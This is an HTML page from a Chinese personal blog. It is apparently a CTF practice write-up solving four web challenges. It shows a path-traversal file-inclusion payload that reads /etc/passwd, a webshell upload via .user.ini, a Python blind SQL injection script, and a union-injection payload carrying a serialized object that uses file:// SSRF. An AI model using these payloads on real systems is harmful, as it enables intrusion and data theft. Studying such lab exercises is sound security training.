@@ -1,0 +1,1150 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+  <script src="https://cuokon.github.io/live2d/autoload.js"></script>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "23b069a1"
+    });
+  daovoice('update');
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css?v=7.2.0">
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+
+
+
+
+  
+  
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.2.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    }
+  };
+</script>
+
+  <meta name="description" content="[HCTF 2018]WarmUp题目页面:查看源代码发现source.php访问source.php可以直接看到php源码然后进行审计第一个if语句,直接判断我们传入的值是否在$whitelist数组里面。第二个if语句,他会先截取问号前面的字符串,然后判断截取后的字符串是否在$whitelist数组里面第三个if语句,他会先url解码,然后在截取问号前面的字符串,最后判断截取后的字符串是否在$">
+<meta name="keywords" content="ctf,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctf练习(2)">
+<meta property="og:url" content="http://cuokon.github.com/2019/12/12/ctf练习(2)/index.html">
+<meta property="og:site_name" content="错空&#39;s Blog">
+<meta property="og:description" content="[HCTF 2018]WarmUp题目页面:查看源代码发现source.php访问source.php可以直接看到php源码然后进行审计第一个if语句,直接判断我们传入的值是否在$whitelist数组里面。第二个if语句,他会先截取问号前面的字符串,然后判断截取后的字符串是否在$whitelist数组里面第三个if语句,他会先url解码,然后在截取问号前面的字符串,最后判断截取后的字符串是否在$">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/1-1.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/1-2.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/1-3.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/1-4.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/1-5.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/1-6.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/2-1.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/2-2.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/2-3.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/2-4.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/2-5.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/2-6.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/2-7.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/2-8.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/2-9.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/3-1.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/3-2.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/3-3.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/3-4.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/4-1.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/4-2.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/4-3.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/4-4.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/4-5.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/4-6.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/4-7.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/4-8.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/4-9.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/4-10.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/4-11.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/4-12.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/4-13.png">
+<meta property="og:updated_time" content="2019-12-13T00:15:57.239Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ctf练习(2)">
+<meta name="twitter:description" content="[HCTF 2018]WarmUp题目页面:查看源代码发现source.php访问source.php可以直接看到php源码然后进行审计第一个if语句,直接判断我们传入的值是否在$whitelist数组里面。第二个if语句,他会先截取问号前面的字符串,然后判断截取后的字符串是否在$whitelist数组里面第三个if语句,他会先url解码,然后在截取问号前面的字符串,最后判断截取后的字符串是否在$">
+<meta name="twitter:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(2)/1-1.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://cuokon.github.com/2019/12/12/ctf练习(2)/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  
+  <title>ctf练习(2) | 错空's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+  
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">错空's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">学无止境</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://cuokon.github.com/2019/12/12/ctf练习(2)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cuo kon">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/43626445">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="错空's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ctf练习(2)
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-12-12 19:18:06" itemprop="dateCreated datePublished" datetime="2019-12-12T19:18:06+08:00">2019-12-12</time>
+            </span>
+          
+
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-12-13 08:15:57" itemprop="dateModified" datetime="2019-12-13T08:15:57+08:00">2019-12-13</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/学习记录/" itemprop="url" rel="index"><span itemprop="name">学习记录</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          
+		  
+		  
+          
+
+          <br>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">2.9k</span>
+            </span>
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">3 分钟</span>
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>题目页面:<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/1-1.png" alt="1"><br>查看源代码发现source.php<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/1-2.png" alt="1-1"><br>访问source.php可以直接看到php源码<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/1-3.png" alt="1-3"><br>然后进行审计<br>第一个if语句,直接判断我们传入的值是否在$whitelist数组里面。<br>第二个if语句,他会先截取问号前面的字符串,然后判断截取后的字符串是否在$whitelist数组里面<br>第三个if语句,他会先url解码,然后在截取问号前面的字符串,最后判断截取后的字符串是否在$whitelist数组里面<br>第一个判断肯定是绕不过去的,第二个的话我们可以构造一个这样的payload<br><code>source.php?../../../../../etc/passwd</code><br>这样他在第二个判断的时候他会返回true,然后让他被include包含,可是问题来了,因为他是个?后面的字符串会被当做参数传入,不能达到我们要的效果,所以第二个判断也绕不过。第三个判断他会先进行url解码,比第二个判断多了个步骤,那么加了这个后我们就有办法可以绕过了,我们把?进行url编码2次。payload变成<br><code>source.php%253f../../../../../etc/passwd</code><br>他在判断的时候会和第二个一样,因为他有个url解码,把我们的<code>%253f</code>变成<code>?</code>,所以他会返回true,然后include会去包含我们的内容<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/1-4.png" alt="1-4"><br>因为他那里还有个hint.php我们访问看看<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/1-5.png" alt="1-5"><br>发现他说flag在ffffllllaaaagggg我们去包含就可以获得flag了<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/1-6.png" alt="1-6"></p>
+<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>题目页面:<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/2-1.png" alt="2-1"><br>上传一个普通的图片<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/2-2.png" alt="2-2"><br>发现他拦截了<code>&lt;?</code>,图片里面不可以出现<code>&lt;?</code>,然后上传一个GIF89a后面接一句话木马<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/2-3.png" alt="2-3"><br>上传成功,并且返回了路径和上传后的所有文件名,尝试上传php文件<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/2-4.png" alt="2-4"><br>上传失败,然后fuzz过后,发现有ph开头的后缀就会拦截<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/2-5.png" alt="2-5"><br>然后看过别人的wp,发现是上传.user.ini文件,他是一个配置文件<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/2-6.png" alt="2-6"><br>php配置中有1个配置,可以让php文件都包含一个任意后缀的文件<br>auto_prepend_file=xxx<br>这个配置相当于require(xxx)<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/2-7.png" alt="2-7"><br>然后访问上传目录的index.php<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/2-8.png" alt="2-8"><br>命令执行成功<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/2-9.png" alt="2-9"></p>
+<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>题目页面:<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/3-1.png" alt="3-1"><br>先判断是什么类型的注入,输入<br><code>1+1</code><br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/3-2.png" alt="3-2"><br>发现被拦截,经过测试过滤了*-+等等,我们可以用^或者/来测试,输入<br><code>2/1</code><br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/3-3.png" alt="3-3"><br>返回了2的内容,输入<br><code>2/2</code><br>返回了1的内容<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/3-4.png" alt="3-4"><br>什么存在数字类型的注入,输入0的话返回的是一个错误,我们可以根据这个来判断这是一个bool类型的注入,然后根据网页显示的内容,我们知道flag在flag表中的flag列中,脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">s = string.printable</span><br><span class="line"></span><br><span class="line">def req():</span><br><span class="line">        flag = &apos;&apos;</span><br><span class="line">        url=&apos;http://7e9d1a4b-e6f7-4e5b-b4cb-564f5eafda81.node3.buuoj.cn/index.php&apos;</span><br><span class="line">        for i in range(1,70):</span><br><span class="line">            for j in s:</span><br><span class="line">                data = &#123;</span><br><span class="line">                        &apos;id&apos;:&apos;(\&apos;&#123;0&#125;\&apos;=ascii((substr((select\nflag\nfrom\nflag),&#123;1&#125;,1))))&apos;.format(ord(j),i)</span><br><span class="line">	        &#125;</span><br><span class="line">                res = requests.post(url,data=data)</span><br><span class="line">                text =res.text</span><br><span class="line">                if(text.find(&apos;glzjin wants a girlfriend&apos;)!=-1):</span><br><span class="line">                    flag += j</span><br><span class="line">                    print(flag)</span><br><span class="line">                    break</span><br><span class="line">req()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Fakebook"><a href="#Fakebook" class="headerlink" title="Fakebook"></a>Fakebook</h2><p>页面:<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/4-1.png" alt="4-1"><br>在join出发现sql注入,抓包,知道username为注入的参数<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/4-2.png" alt="4-2"><br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/4-3.png" alt="4-3"><br>跑到里面的数据都是反序列化的<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/4-4.png" alt="4-4"><br>可是没有类,就没有什么办法构造,而且sql注入也没有写shell成功,然后对目录进行了一波爆破,发现有robots.txt和flag.php<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/4-5.png" alt="4-5"><br>有备份文件,下载后查看<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/4-6.png" alt="4-6"><br>看到curl就想到了是ssrf,代码不是特别难只对blog进行了过滤,要求我们输入以http://和https:// 开头的字符串,只要把blog的地址替换成读取flag的file://协议, 就可以拿到flag<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/4-7.png" alt="4-7"><br>然后点击username那个链接<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/4-8.png" alt="4-8"><br>输入一个不存在的值<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/4-9.png" alt="4-9"><br>发现爆出了绝对路径,然后可以知道flag的绝对路径是/var/www/html/flag.php,然后测试是否有sql注入<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/4-10.png" alt="4-10"><br>发现他报错了,而且报错信息是有未闭合的’,所以猜测这里存在sql注入,这里就有思考一下了,他这个地方是从数据库读取反序列化的内容,结果序列化后读取blog的地址,在去用curl请求,那么我们可以让他读取到我们的构造的序列化的内容,替换掉数据库查询的内容,我们可以随便在sqlmap中去一个序列化的内容<br>例如我取<br><code>O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:16:&quot;cuokon.github.io&quot;;}</code><br>然后我们修改最后面的blog字符串长度和blog的地址,变成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后构造sql语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=0 union/**/select 1,2,3,&apos;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&apos;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/4-11.png" alt="4-11"><br>这里用<code>/**/</code>的原因是union和select不能在一起,否则会被拦截<br>然后因为他把内容放在图片上进行了base64加密,我们右键查看源代码就可以拿到里面的内容了<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/4-12.png" alt="4-11"><br>base64解密<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(2)/4-13.png" alt="4-12"></p>
+
+      
+    </div>
+
+    
+
+    
+      
+    
+
+    
+    
+    
+
+
+
+    
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>cuo kon</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="http://cuokon.github.com/2019/12/12/ctf练习(2)/" title="ctf练习(2)">http://cuokon.github.com/2019/12/12/ctf练习(2)/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/10/ctf练习(1)/" rel="next" title="ctf练习(1)">
+                <i class="fa fa-chevron-left"></i> ctf练习(1)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+  
+    
+    
+  <div class="comments" id="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC80NTY1Ni8yMjE2Nw=="></div>
+  </div>
+  
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  
+    <img class="site-author-image" itemprop="image" src="https://avatars3.githubusercontent.com/u/43626445" alt="cuo kon">
+  
+  <p class="site-author-name" itemprop="name">cuo kon</p>
+  <div class="site-description motion-element" itemprop="description"></div>
+</div>
+
+
+  <nav class="site-state motion-element">
+    
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+
+
+
+
+  <div class="links-of-author motion-element">
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/cuokon" title="GitHub &rarr; https://github.com/cuokon" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:2804745224@qq.com" title="E-Mail &rarr; mailto:2804745224@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+
+
+
+  <div class="cc-license motion-element" itemprop="license">
+  
+  
+    
+  
+  
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+
+  <div class="links-of-blogroll motion-element links-of-blogroll-block">
+    <div class="links-of-blogroll-title">
+      <i class="fa  fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://www.fxnetw.com" title="https://www.fxnetw.com" rel="noopener" target="_blank">风雪's Blog</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://shadownb.github.io/" title="https://shadownb.github.io/" rel="noopener" target="_blank">shadow's Blog</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://www.lbx0726.com/" title="https://www.lbx0726.com/" rel="noopener" target="_blank">lbx0726's Blog</a>
+        </li>
+      
